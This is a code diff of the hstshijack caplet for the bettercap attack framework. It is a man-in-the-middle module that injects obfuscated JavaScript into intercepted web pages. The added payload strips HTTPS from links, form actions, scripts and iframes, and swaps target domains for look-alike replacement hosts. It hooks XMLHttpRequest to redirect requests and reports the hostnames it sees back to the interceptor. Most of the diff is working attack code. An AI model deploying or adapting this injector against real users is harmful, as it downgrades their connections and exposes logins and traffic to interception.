@@ -1,64 +1,184 @@
-/*
- * Documentation can be found at https://github.com/bettercap/caplets/tree/master/hstshijack
- */
 
-var ssl = {
-  "domains": [],
-  "index": {},
-  "hierarchy": "-.0123456789abcdefghijklmnopqrstuvwxyz"
-};
- 
+/* Declare variables */
+
+var ssl_log = [],
+    whitelist = {}
+
 var payload,
-    payload_container_prefix = (
-      "if (!globalThis.{{SESSION_ID_TAG}}) {\n" +
-         "globalThis.{{SESSION_ID_TAG}} = function() {\n"),
-    payload_container_suffix = (
-         "\n}\n" +
-         "globalThis.{{SESSION_ID_TAG}}();\n" +
-      "}\n");
+    payload_container = new String(
+    	"if (!{{session_id}}) {\n" + 
+
+    		"var {{session_id}} = function() {\n" + 
+    			"{{variables}}\n" + 
+				"var obf_var_callback_log = [];" + 
+				"function obf_func_toWholeRegexp(obf_var_string) {" + 
+					"obf_var_string = obf_var_string.replace(/\\./g, \"\\\\.\");" + 
+					"obf_var_string = obf_var_string.replace(/\\-/g, \"\\\\-\");" + 
+					"return new RegExp(\"^\" + obf_var_string + \"$\", \"ig\")" + 
+				"}" + 
+
+				"function obf_func_toWholeWildcardRegexp(obf_var_string) {" + 
+					"obf_var_string = obf_var_string.replace(/\\-/g, \"\\\\-\");" + 
+					"obf_var_string = obf_var_string.replace(\"*.\", \"((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?.)+)\");" + 
+					"obf_var_string = obf_var_string.replace(/\\./g, \"\\\\.\");" + 
+					"return new RegExp(\"^\" + obf_var_string + \"$\", \"ig\")" + 
+				"}" + 
+				"function obf_func_hstshijack(obf_host) {" + 
+					"for (obf_var_i = 0; obf_var_i < obf_var_target_hosts.length; obf_var_i++) {" + 
+						"var obf_var_regexp;" + 
+						"if (obf_var_target_hosts[obf_var_i].match(/^\\*/)) {" + 
+							"obf_var_regexp = obf_func_toWholeWildcardRegexp(obf_var_target_hosts[obf_var_i]);" + 
+						"} else {" + 
+							"obf_var_regexp = obf_func_toWholeRegexp(obf_var_target_hosts[obf_var_i]);" + 
+						"}" + 
+						"if (obf_host.match(obf_var_regexp)) {" + 
+							"var obf_var_replacement;" + 
+							"if (obf_var_target_hosts[obf_var_i].match(/^\\*/)) {" + 
+								"obf_var_replacement = \"$1\" + obf_var_replacement_hosts[obf_var_i].replace(/^\\*\\./, \"\");" + 
+							"} else {" + 
+								"obf_var_replacement = obf_var_replacement_hosts[obf_var_i];" + 
+							"}" + 
+							"obf_host = obf_host.replace(obf_var_regexp, obf_var_replacement);" + 
+							"return obf_host;" + 
+						"}" + 
+					"}" + 
+					"return obf_host;" + 
+				"}" + 
+				"function obf_func_attack_XMLHttpRequest() {" + 
+					"var obf_func_open = XMLHttpRequest.prototype.open;" + 
+					"XMLHttpRequest.prototype.open = function(obf_var_method, obf_var_url, obf_var_async, obf_var_username, obf_var_password) {" + 
+						"for (obf_var_i = 0; obf_var_i < obf_var_target_hosts.length; obf_var_i++) {" + 
+							"obf_var_host = obf_func_hstshijack(obf_var_url.replace(/^http[s]?:\\/\\/([^:/?#]+).*$/i, \"$1\"));" + 
+							"obf_var_path = obf_var_url.replace(/^(?:http[s]?:\\/\\/[^:/?#]*)?([:/?#].*$)/, \"$1\");" + 
+							"obf_var_url = \"http://\" + obf_var_host + obf_var_path;" + 
+						"}" + 
+						"return obf_func_open.apply(this, arguments);" + 
+					"}" + 
+				"}" + 
+
+
+				"function replaze() {" +
+					"var anchors = document.getElementsByTagName('a');" +
+					"var forms = document.getElementsByTagName('form');" +
+					"var hostname;" +
+					"var replaced_hostname;" +
+					"for (var i = 0; i < anchors.length; i++) {" +
+						"anchors[i].href = anchors[i].href.replace('https://', 'http://');" +
+						"hostname = anchors[i].href.replace('http://','').split('/')[0];" +
+
+						"for (var j = 0; j < obf_var_target_hosts.length; j++) {" +
+							"if (obf_var_target_hosts[j].includes('*')) {" +
+								"var replace_string = obf_var_target_hosts[j].replace('*', '');" +
+								"var replacement_string = obf_var_replacement_hosts[j].replace('*', '');" +
+								"if (hostname.includes(replace_string)) {" +
+									"anchors[i].href = anchors[i].href.replace(replace_string, replacement_string);	" +
+									"break;" +
+								"}" +
+							"} else {" +
+								"if (obf_var_target_hosts[j] == hostname) {" +
+									"anchors[i].href = anchors[i].href.replace(obf_var_target_hosts[j], obf_var_replacement_hosts[j]);" +
+									"break;" +
+									"}" +
+								"}" +
+							"}" +
+							"anchors[i].removeAttribute('onmousedown');" +
+					"}" +
+					"for (var i = 0; i < forms.length; i++) {" +
+						"forms[i].action = forms[i].action.replace('https://', 'http://');" +
+						"hostname = forms[i].action.replace('http://','').split('/')[0];" +
+
+						"for (var j = 0; j < obf_var_target_hosts.length; j++) {" +
+							"if (obf_var_target_hosts[j].includes('*')) {" +
+								"var replace_string = obf_var_target_hosts[j].replace('*', '');" +
+								"var replacement_string = obf_var_replacement_hosts[j].replace('*', '');" +
+								"if (hostname.includes(replace_string)) {" +
+									"forms[i].action = forms[i].action.replace(replace_string, replacement_string);	" +
+									"break;" +
+								"}" +
+							"} else {" +
+								"if (obf_var_target_hosts[j] == hostname) {" +
+									"forms[i].action = forms[i].action.replace(obf_var_target_hosts[j], obf_var_replacement_hosts[j]);" +
+									"break;" +
+									"}" +
+								"}" +
+							"}" +
+					"}" +
+				"}" +
+				"window.addEventListener('load', replaze);"+
+
+				"function obf_func_callback(obf_var_data) {" + 
+					"obf_var_req = new XMLHttpRequest();" + 
+					"obf_var_req.open(\"GET\", \"http://\" + location.host + \"/obf_path_ssl_log?\" + obf_var_data, true);" + 
+					"obf_var_req.send();" + 
+				"}" + 
+				"function obf_func_attack() {" + 
+					"try {" + 
+						"obf_var_regexp = new RegExp(\"http[s]?:\\\\/\\\\/((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\\\\.)+(?:[a-z]{1,63}))\", \"ig\");" + 
+						"obf_var_urls = document.body.innerHTML.match(obf_var_regexp);" + 
+						"for (var obf_var_i = 0; obf_var_i < obf_var_urls.length; obf_var_i++) {" + 
+							"obf_var_host = obf_var_urls[obf_var_i].replace(obf_var_regexp, \"$1\");" + 
+							"if (obf_var_callback_log.indexOf(obf_var_host) == -1) {" + 
+								"obf_func_callback(btoa(obf_var_host));" + 
+								"obf_var_callback_log.push(obf_var_host);" + 
+							"}" + 
+						"}" + 
+					"} catch(obf_ignore){}" + 
+					"try {" + 
+						"document.querySelectorAll(\"a,form,script,iframe\").forEach(function(obf_var_node){" + 
+							"obf_var_url = \"\";" + 
+							"switch (obf_var_node.tagName) {" + 
+								"case \"A\": obf_var_node.href ? obf_var_url = obf_var_node.href : \"\"; break;" + 
+								"case \"FORM\": obf_var_node.action ? obf_var_url = obf_var_node.action : \"\"; break;" + 
+								"case \"SCRIPT\": obf_var_node.src ? obf_var_url = obf_var_node.src : \"\"; break;" + 
+								"case \"IFRAME\": obf_var_node.src ? obf_var_url = obf_var_node.src : \"\"; break;" + 
+							"}" + 
+							"if (obf_var_url.match(/^http[s]?:\\/\\/[^/?#]+(?:[/?#].*$)?/i)) {" + 
+								"obf_var_path = obf_var_url.replace(/^http[s]?:\\/\\/[^:/?#]+([:/?#].*$)?/i, \"$1\");" + 
+								"obf_var_host = obf_func_hstshijack(obf_var_url.replace(/^http[s]?:\\/\\/([^:/?#]+).*/i, \"$1\"));" + 
+								"switch (obf_var_node.tagName) {" + 
+									"case \"A\": obf_var_node.href ? obf_var_node.href = \"http://\" + obf_var_host + obf_var_path : \"\"; break;" + 
+									"case \"FORM\": obf_var_node.action ? obf_var_node.action = \"http://\" + obf_var_host + obf_var_path : \"\"; break;" + 
+									"case \"SCRIPT\": obf_var_node.src ? obf_var_node.src = \"http://\" + obf_var_host + obf_var_path : \"\"; break;" + 
+									"case \"IFRAME\": obf_var_node.src ? obf_var_node.src = \"http://\" + obf_var_host + obf_var_path : \"\"; break;" + 
+								"}" + 
+							"}" + 
+						"});" + 
+					"} catch(obf_ignore){}" + 
+				"}" + 
+				"setInterval(function(){" + 
+					"obf_func_attack();" + 
+					"obf_func_attack_XMLHttpRequest();" + 
+				"}, 666);" + 
+				"try {" + 
+					"document.addEventListener(\"DOMContentLoaded\", obf_func_attack);" + 
+					"document.addEventListener(\"DOMContentLoaded\", obf_func_attack_XMLHttpRequest);" + 
+				"} catch(obf_ignore){" + 
+					"self.addEventListener(\"load\", obf_func_attack);" + 
+					"self.addEventListener(\"load\", obf_func_attack_XMLHttpRequest);" + 
+				"}" + 
+				"obf_func_attack();" + 
+				"{{custom_payload}}\n" + 
+    		"}\n" + 
+    		"{{session_id}}();\n" + 
+    	"}\n")
 
 var ignore_hosts       = [],
     target_hosts       = [],
     replacement_hosts  = [],
-    block_script_hosts = [];
+    block_script_hosts = [],
+    custom_payloads
 
-var payloads = {},
-    obfuscate;
+var obfuscate,
+    encode
 
 var callback_path,
     whitelist_path,
-    ssl_index_path,
+    ssl_log_path,
     session_id,
-    varname_target_hosts,
-    varname_replacement_hosts;
+    var_target_hosts,
+    var_replacement_hosts
 
-var math_seed;
-
-var whitelist = {};
-
-var selector_header = /^\s*(.*?)\s*:\s*(.*?)\s*$/,
-    selector_header_csp = /content-security-policy:.*?\r\n/ig,
-    selector_header_set_cookie = /^set-cookie$/i,
-    selector_header_set_cookie_secure_samesite = /^(?:secure$|samesite=)/i,
-    selector_content_type_html = /text[/](?:html|xml)|application[/](?:hta|xhtml[+]xml|xml)/i,
-    selector_extension_html = /[.](?:html|htm|xml|xhtml|xhtm|xht|hta)$/i,
-    selector_meta_tag_csp = / http-equiv=['"]?Content-Security-Policy['"]?([ />])/ig,
-    selector_strip_whitespace = /^\s*(.*?)\s*$/,
-    selector_uri_one = /^https:\/\//i,
-    selector_uri_two = /https:\/\/([^:/?#]*).*/i,
-    selector_content_type_js = /\S+[/]javascript/i,
-    selector_html_magic = /^\s*</g,
-    selector_html_script_open_tag = /<script(\s|>)/ig,
-    selector_html_script_close_tag = /<\/script(\s|>)/ig,
-    selector_all_dashes = /\-/g,
-    selector_all_dots = /\./g,
-    selector_scheme_http_https_colon = /(http)s:/ig,
-    selector_port_https = /:443($|[^0-9])/g,
-    selector_regset_wildcard_one = /^\*\./,
-    selector_regset_wildcard_two = /\.\*$/,
-    selector_regset_wildcard_three = /\.\*$/g,
-    selector_regset_wildcard_four = /\.\*/g,
-    selector_query_param = /(^[^=]*)=(.*$)/;
+var math_seed
 
 var red      = "\033[31m",
     yellow   = "\033[33m",
@@ -68,986 +188,684 @@ var red      = "\033[31m",
     on_grey  = "\033[40;37m",
     on_blue  = "\033[104;30m",
     bold     = "\033[1;37m",
-    reset    = "\033[0m";
+    reset    = "\033[0m"
+
+/* Declare functions */
 
 function randomFloat() {
-  r = Math.sin(math_seed++) * 10000;
-  return r - Math.floor(r);
+	r = Math.sin(math_seed++) * 10000
+	return r - Math.floor(r)
 }
 
 function randomString(length) {
-  length = parseInt(length);
-  var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
-      buff  = new Array(length);
-  for (var a = 0; a < buff.length; a++) {
-    index = parseInt(Math.random() * chars.length);
-    buff[a] = chars.charAt(index)
-  }
-  return buff.join("");
+	var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
+	    buff  = ""
+	while (buff.length < length) {
+		index = parseInt( Math.random() * chars.length )
+		buff = buff + chars.charAt(index)
+	}
+	return buff
 }
 
-function toRegexp(selector_string, replacement_string) {
-  selector_string = selector_string.replace(selector_all_dots, "\\.");
-  selector_string = selector_string.replace(selector_all_dashes, "\\-");
-  return [
-    new RegExp("(^|[^a-z0-9-.])" + selector_string + "($|[^a-z0-9-.])", "ig"),
-    "$1" + replacement_string + "$2"
-  ];
+function toRegexp(string) {
+	string = string.replace(/\./g, "\\.")
+	string = string.replace(/\-/g, "\\-")
+	return new RegExp("([^a-z0-9-.]|^)" + string + "([^a-z0-9\\-\\.]|$)", "ig")
 }
 
-function toWholeRegexp(selector_string, replacement_string) {
-  selector_string = selector_string.replace(selector_all_dots, "\\.");
-  selector_string = selector_string.replace(selector_all_dashes, "\\-");
-  return [
-    new RegExp("^" + selector_string + "$", "ig"),
-    replacement_string
-  ];
+function toWholeRegexp(string) {
+	string = string.replace(/\./g, "\\.")
+	string = string.replace(/\-/g, "\\-")
+	return new RegExp("^" + string + "$", "ig")
 }
 
-function toWildcardRegexp(selector_string, replacement_string) {
-  selector_string = selector_string.replace(selector_all_dashes, "\\-");
-  if (selector_string.match(selector_regset_wildcard_one)) {
-    selector_string = selector_string.replace(selector_regset_wildcard_one, "((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?.)+)");
-    selector_string = selector_string.replace(selector_all_dots, "\\.");
-    replacement_string = replacement_string.replace(selector_regset_wildcard_one, "");
-    return [
-      new RegExp(selector_string, "ig"),
-      "$1" + replacement_string
-    ];
-  } else if (selector_string.match(selector_regset_wildcard_two)) {
-    selector_string = selector_string.replace(selector_regset_wildcard_three, "((?:.[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?)+)");
-    selector_string = selector_string.replace(selector_all_dots, "\\.");
-    replacement_string = replacement_string.replace(selector_regset_wildcard_two, "");
-    return [
-      new RegExp(selector_string, "ig"),
-      replacement_string + "$1"
-    ];
-  } else {
-    log_error(on_blue + "hstshijack" + reset + " Invalid toWildcardRegexp() value (got " + selector_string + ").");
-  }
+function toWildcardRegexp(string) {
+	string = string.replace(/\-/g, "\\-")
+	string = string.replace("*.", "((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?.)+)")
+	string = string.replace(/\./g, "\\.")
+	return new RegExp(string + "([^a-z0-9-.]|$)", "ig")
 }
 
-function toWholeWildcardRegexp(selector_string, replacement_string) {
-  selector_string = selector_string.replace(selector_all_dashes, "\\-");
-  if (selector_string.match(selector_regset_wildcard_one)) {
-    selector_string = selector_string.replace(selector_regset_wildcard_one, "((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?.)+)");
-    selector_string = selector_string.replace(selector_all_dots, "\\.");
-    replacement_string = replacement_string.replace(selector_regset_wildcard_one, "");
-    return [
-      new RegExp("^" + selector_string + "$", "ig"),
-      "$1" + replacement_string
-    ];
-  } else if (selector_string.match(selector_regset_wildcard_two)) {
-    selector_string = selector_string.replace(selector_regset_wildcard_four, "((?:.[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?)+)");
-    selector_string = selector_string.replace(selector_all_dots, "\\.");
-    replacement_string = replacement_string.replace(selector_regset_wildcard_two, "");
-    return [
-      new RegExp(selector_string, "ig"),
-      replacement_string + "$1"
-    ];
-  } else {
-    log_error(on_blue + "hstshijack" + reset + " Invalid toWholeWildcardRegexp() value (got " + selector_string + ").");
-  }
-}
-
-/* Matches /(^|[^a-z0-9-.])example\.com($|[^a-z0-9-.])/ig */
-function toRegexpSet(selector_string, replacement_string) {
-  if (selector_string.indexOf("*") !== -1) {
-    return toWildcardRegexp(selector_string, replacement_string);
-  } else {
-    return toRegexp(selector_string, replacement_string);
-  }
-}
-
-/* Matches ^example.com$ */
-function toWholeRegexpSet(selector_string, replacement_string) {
-  if (selector_string.indexOf("*") !== -1) {
-    return toWholeWildcardRegexp(selector_string, replacement_string);
-  } else {
-    return toWholeRegexp(selector_string, replacement_string);
-  }
-}
-
-/* Saves the list of domains using SSL, as well as its index ranges. */
-function saveSSLIndex() {
-  writeFile(env["hstshijack.ssl.domains"], ssl.domains.join("\n"));
-  writeFile(env["hstshijack.ssl.index"], JSON.stringify(ssl.index, null, 2));
-}
-
-/* Returns the amount of characters of an identical prefix of two given strings. */
-function getMatchingPrefixLength(string1, string2) {
-  count = 0;
-  if (string1.length > string2.length) {
-    for (a = 0; a < string2.length; a++) {
-      if (string1.charAt(a) !== string2.charAt(a)) {
-        break;
-      }
-      count++;
-    }
-  } else {
-    for (a = 0; a < string1.length; a++) {
-      if (string1.charAt(a) !== string2.charAt(a)) {
-        break;
-      }
-      count++;
-    }
-  }
-  return count;
-}
-
-/* Returns true if domain1 gets alphanumeric precendence over domain2. */
-function getsPrecedence(domain1, domain2) {
-  if (domain1.length > domain2.length) {
-    /* If the first given domain is longer than the second. */
-    for (a = 0; a < domain2.length; a++) {
-      rank1 = ssl.hierarchy.indexOf(domain1.charAt(a));
-      rank2 = ssl.hierarchy.indexOf(domain2.charAt(a));
-      if (rank1 > rank2) {
-        return false;
-      } else if (rank1 < rank2) {
-        return true;
-      }
-    }
-    return false;
-  } else {
-    /* If the second given domain is longer than the first. */
-    for (a = 0; a < domain1.length; a++) {
-      rank1 = ssl.hierarchy.indexOf(domain1.charAt(a));
-      rank2 = ssl.hierarchy.indexOf(domain2.charAt(a));
-      if (rank1 > rank2) {
-        return false;
-      } else if (rank1 < rank2) {
-        return true;
-      }
-    }
-    return true;
-  }
-}
-
-/* Returns an array with the first and last index of an alphanumeric range of domains.
- * This is the range in which domains are/will be indexed. */
-function getIndexRange(char) {
-  if (index_range = ssl.index[char]) {
-    /* Character is already indexed. */
-    return index_range;
-  } else {
-    /* Character is not yet indexed. */
-    indexed_chars = Object.keys(ssl.index).concat(char).sort();
-    this_char_index = indexed_chars.indexOf(char);
-    if (
-         indexed_chars[this_char_index - 1]
-      && indexed_chars[this_char_index + 1]
-    ) {
-      /* Will not be the first nor last indexed character. */
-      return [
-        ssl.index[indexed_chars[this_char_index + 1]][0],
-        ssl.index[indexed_chars[this_char_index + 1]][0]
-      ];
-    } else if (indexed_chars[this_char_index + 1]) {
-      /* Will be the first indexed character, but not the last. */
-      return [
-        0,
-        ssl.index[indexed_chars[this_char_index + 1]][0]
-      ];
-    } else if (indexed_chars[this_char_index - 1]) {
-      /* Will be the last indexed character, but not the first. */
-      if (ssl.domains.length === 1) {
-        /* Will be the second and last indexed character. */
-        return [
-          ssl.index[indexed_chars[this_char_index - 1]][1] + 1,
-          1
-        ];
-      } else {
-        /* Will be the last but not the second indexed character. */
-        return [
-          ssl.index[indexed_chars[this_char_index - 1]][1] + 1,
-          ssl.domains.length
-        ];
-      }
-    } else {
-      /* Will be the first and last indexed character. */
-      return [0, 0];
-    }
-  }
-}
-
-/* Returns the index of a given domain within a given index range. */
-function getDomainIndex(domain, index_range) {
-  domain = domain.toLowerCase();
-  if (
-       index_range[0] === index_range[1]
-    && domain === ssl.domains[index_range[0]]
-  ) {
-    /* This domain is the only indexed domain with this first character. */
-    return index_range[0];
-  }
-  /* Return this domain's index when found in this index range. */
-  for (a = index_range[0]; a < index_range[1] + 1; a++) {
-    if (domain === ssl.domains[a]) {
-      return a;
-    }
-  }
-  /* This domain is not indexed. */
-  return -1;
-}
-
-/* Index a new domain. */
-function indexDomain(domain) {
-  domain = domain.toLowerCase();
-  first_char = domain.charAt(0);
-  index_range = getIndexRange(first_char);
-  if (getDomainIndex(domain, index_range) === -1) {
-    /* This domain is not indexed yet. */
-    log_debug(on_blue + "hstshijack" + reset + " Indexing domain " + bold + domain + reset + " ...");
-    indexed_chars = Object.keys(ssl.index);
-    if (index_range[0] === index_range[1]) {
-      /* This index range consists of only one index. */
-      if (ssl.domains[index_range[0]]) {
-        /* This index range contains one domain. */
-        new_index = index_range[0];
-        if (getsPrecedence(ssl.domains[index_range[0]], domain)) {
-          new_index++;
-        }
-        arr_ = ssl.domains.slice(0, new_index);
-        _arr = ssl.domains.slice(new_index, ssl.domains.length);
-        ssl.domains = [].concat(arr_, [domain], _arr);
-        ssl.index[first_char] = [
-          index_range[0],
-          index_range[1] + 1
-        ];
-      } else {
-        /* This index range contains no domains. */
-        ssl.domains.push(domain);
-        ssl.index[first_char] = [
-          index_range[0],
-          index_range[1]
-        ];
-      }
-    } else {
-      /* This index range consists of multiple domains. */
-      new_index = index_range[0];
-      for (var a = index_range[0]; a < index_range[1] + 1; a++) {
-        if (!getsPrecedence(domain, ssl.domains[a])) {
-          new_index = a + 1;
-        } else {
-          break;
-        }
-      }
-      arr_ = ssl.domains.slice(0, new_index);
-      _arr = ssl.domains.slice(new_index, ssl.domains.length);
-      ssl.domains = [].concat(arr_, [domain], _arr);
-      ssl.index[first_char] = [
-        index_range[0],
-        index_range[1] + 1
-      ];
-    }
-    remaining_indexed_chars = indexed_chars.slice(index_range[1] + 1);
-    for (a = 0; a < remaining_indexed_chars.length; a++) {
-      indexed_char = remaining_indexed_chars[a];
-      index_range = ssl.index[indexed_char];
-      ssl.index[indexed_char] = [
-        index_range[0] + 1,
-        index_range[1] + 1
-      ];
-    }
-    saveSSLIndex();
-  } else {
-    /* This domain is already indexed. */
-    log_debug(on_blue + "hstshijack" + reset + " Skipped already indexed domain " + bold + domain + reset);
-  }
+function toWholeWildcardRegexp(string) {
+	string = string.replace(/\-/g, "\\-")
+	string = string.replace("*.", "((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?.)+)")
+	string = string.replace(/\./g, "\\.")
+	return new RegExp("^" + string + "$", "ig")
 }
 
 function configure() {
-  /* Read caplet. */
-  env["hstshijack.ignore"]
-    ? ignore_hosts = env["hstshijack.ignore"].replace(/\s/g, "").split(",")
-    : ignore_hosts = [];
-  env["hstshijack.targets"]
-    ? target_hosts = env["hstshijack.targets"].replace(/\s/g, "").split(",")
-    : target_hosts = [];
-  env["hstshijack.replacements"]
-    ? replacement_hosts = env["hstshijack.replacements"].replace(/\s/g, "").split(",")
-    : replacement_hosts = [];
-  env["hstshijack.blockscripts"]
-    ? block_script_hosts = env["hstshijack.blockscripts"].replace(/\s/g, "").split(",")
-    : block_script_hosts = [];
-  env["hstshijack.obfuscate"]
-    ? obfuscate = env["hstshijack.obfuscate"].replace(/\s/g, "").toLowerCase()
-    : obfuscate = false;
+	// Read caplet.
+	env["hstshijack.ignore"]         ? ignore_hosts       = env["hstshijack.ignore"].replace(/\s/g, "").split(",")         : ignore_hosts       = []
+	env["hstshijack.targets"]        ? target_hosts       = env["hstshijack.targets"].replace(/\s/g, "").split(",")        : target_hosts       = []
+	env["hstshijack.replacements"]   ? replacement_hosts  = env["hstshijack.replacements"].replace(/\s/g, "").split(",")   : replacement_hosts  = []
+	env["hstshijack.blockscripts"]   ? block_script_hosts = env["hstshijack.blockscripts"].replace(/\s/g, "").split(",")   : block_script_hosts = []
+	env["hstshijack.payloads"]       ? custom_payloads    = env["hstshijack.payloads"].replace(/\s/g, "").split(",")       : custom_payloads    = []
+	env["hstshijack.obfuscate"]      ? obfuscate          = env["hstshijack.obfuscate"].replace(/\s/g, "").toLowerCase()   : obfuscate          = false
+	env["hstshijack.encode"]         ? encode             = env["hstshijack.encode"].replace(/\s/g, "").toLowerCase()      : encode             = false
 
-  /* Validate caplet. */
-  if (target_hosts.length < replacement_hosts.length) {
-    log_fatal(on_blue + "hstshijack" + reset + " Too many hstshijack.replacements (got " + replacement_hosts.length + ").");
-  }
-  if (target_hosts.length > replacement_hosts.length) {
-    log_fatal(on_blue + "hstshijack" + reset + " Not enough hstshijack.replacements (got " + replacement_hosts.length + ").");
-  }
-  if (target_hosts.indexOf("*") !== -1) {
-    log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.targets value (got *).");
-  }
-  if (replacement_hosts.indexOf("*") !== -1) {
-    log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.replacements value (got *).");
-  }
+	// Validate caplet.
+	target_hosts.length < replacement_hosts.length ? log_fatal(on_blue + "hstshijack" + reset + " Too many hstshijack.replacements (got " + replacement_hosts.length + ").") : ""
+	target_hosts.length > replacement_hosts.length ? log_fatal(on_blue + "hstshijack" + reset + " Not enough hstshijack.replacements (got " + replacement_hosts.length + ").") : ""
+	target_hosts.indexOf("*") != -1                 ? log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.targets value (got *).") : ""
+	replacement_hosts.indexOf("*") != -1            ? log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.replacements value (got *).") : ""
+	for (var i = 0; i < ignore_hosts.length; i++) {
+		!ignore_hosts[i].match(/^(?:\*$|\*\.[a-z]{1,63}|(?:(?:\*\.|)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:[a-z]{1,63})))$/ig) ? log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.ignore value (got " + ignore_hosts[i] + ").") : ""
+	}
+	for (var i = 0; i < target_hosts.length; i++) {
+		!target_hosts[i].match(/^(?:\*\.[a-z0-9]{1,63}(?:[.]?[a-z0-9]{1,63})*$|(?:(?:\*\.|)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:[a-z]{1,63})))$/ig) ? log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.targets value (got " + target_hosts[i] + ").") : ""
+	}
+	for (var i = 0; i < replacement_hosts.length; i++) {
+		!replacement_hosts[i].match(/^(?:\*\.[a-z0-9]{1,63}(?:[.]?[a-z0-9]{1,63})*$|(?:(?:\*\.|)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:[a-z]{1,63})))$/ig) ? log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.replacements value (got " + replacement_hosts[i] + ").") : ""
+	}
+	for (var i = 0; i < block_script_hosts.length; i++) {
+		!block_script_hosts[i].match(/^(?:\*\.[a-z]+$|(?:(?:\*\.|)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:[a-z]{1,63})))$/ig) ? log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.blockscripts value (got " + block_script_hosts[i] + ").") : ""
+	}
+	if (obfuscate == "false") {
+		obfuscate = false
+	}
+	if (encode == "false") {
+		encode = false
+	}
+	// Preload custom payloads.
+	p = {}
+	for (var a = 0; a < custom_payloads.length; a++) {
+		if ( !custom_payloads[a].match(/^(?:\*|(?:(?:\*\.|)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:[a-z]{1,63}))):.+?$/) ) {
+			log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.payloads value (got " + custom_payloads[a] + ").")
+		}
 
-  whole_prefix_wildcard_domain_selector = /^(?:\*\.[a-z]{1,63}|(?:(?:\*\.|)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:[a-z]{1,63})))$/i;
-  whole_suffix_wildcard_domain_selector = /^(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+\*$/i;
-  for (a = 0; a < ignore_hosts.length; a++) {
-    if (
-         !ignore_hosts[a].match(/^\*$/i)
-      && !ignore_hosts[a].match(whole_prefix_wildcard_domain_selector)
-      && !ignore_hosts[a].match(whole_suffix_wildcard_domain_selector)
-    ) {
-      log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.ignore value (got " + ignore_hosts[a] + ").");
-    }
-  }
+		host = custom_payloads[a].replace(/[:].*/, "")
+		path = custom_payloads[a].replace(/.*[:]/, "")
 
-  for (a = 0; a < target_hosts.length; a++) {
-    if (
-         !target_hosts[a].match(whole_prefix_wildcard_domain_selector)
-      && !target_hosts[a].match(whole_suffix_wildcard_domain_selector)
-    ) {
-      log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.targets value (got " + target_hosts[a] + ").");
-    }
+		if ( !readFile(path) ) {
+			log_error(on_blue + "hstshijack" + reset + " Could not read a path in hstshijack.payloads (got " + path + ").")
+		} else {
+			custom_payload = readFile(path).replace(/obf_path_whitelist/g, whitelist_path).replace(/obf_path_callback/g, callback_path)
 
-    if (
-         !replacement_hosts[a].match(whole_prefix_wildcard_domain_selector)
-      && !replacement_hosts[a].match(whole_suffix_wildcard_domain_selector)
-    ) {
-      log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.replacements value (got " + replacement_hosts[a] + ").");
-    }
+			if (obfuscate) {
+				obfuscation_variables = custom_payload.match(/obf_[a-z\_]*/ig) || []
+				for (var b = 0; b < obfuscation_variables.length; b++) {
+					regexp = new RegExp(obfuscation_variables[b], "g")
+					custom_payload = custom_payload.replace( regexp, randomString( 8 + Math.random() * 16 ) )
+				}
+			}
 
-    if (target_hosts[a].match(/\*/g) || replacement_hosts[a].match(/\*/g)) {
-      target_host_wildcard_count      = target_hosts[a].match(/\*/g).length      || 0;
-      replacement_host_wildcard_count = replacement_hosts[a].match(/\*/g).length || 0;
-      if (target_host_wildcard_count !== replacement_host_wildcard_count) {
-        log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.targets or hstshijack.replacements value, wildcards do not match (got " + target_hosts[a] + " and " + replacement_hosts[a] + ").");
-      }
-    }
-  }
+			// Escape dollar signs for regexp replacement
+			if (p[host]) {
+				p[host] = { "payload": p[host].payload + "\n" + custom_payload.replace(/\$/g, "$$$$$$$$") }
+			} else {
+				p[host] = { "payload": custom_payload.replace(/\$/g, "$$$$$$$$") }
+			}
+		}
+	}
+	custom_payloads = p
+	// Prepare core payload.
+	payload = payload_container.replace(/\$/g, "$$$$$$$$")
+	payload = payload.replace("{{payload}}", payload)
+	payload = payload.replace(/\{\{session_id\}\}/g, session_id)
+	payload = payload.replace("obf_path_whitelist", whitelist_path)
+	payload = payload.replace("obf_path_callback", callback_path)
+	payload = payload.replace("obf_path_ssl_log", ssl_log_path)
+	payload = payload.replace( "{{variables}}", "{{variables}}\nvar " + var_replacement_hosts + " = [\"" + replacement_hosts.join("\",\"") + "\"]\n" )
+	payload = payload.replace( "{{variables}}", "var " + var_target_hosts + " = [\"" + target_hosts.join("\",\"") + "\"]" )
+	payload = payload.replace(/obf_var_replacement_hosts/g, var_replacement_hosts)
+	payload = payload.replace(/obf_var_target_hosts/g, var_target_hosts)
+	// Obfuscate core payload.
+	if (obfuscate) {
+		obfuscation_variables = payload.match(/obf_[a-z\_]*/ig) || []
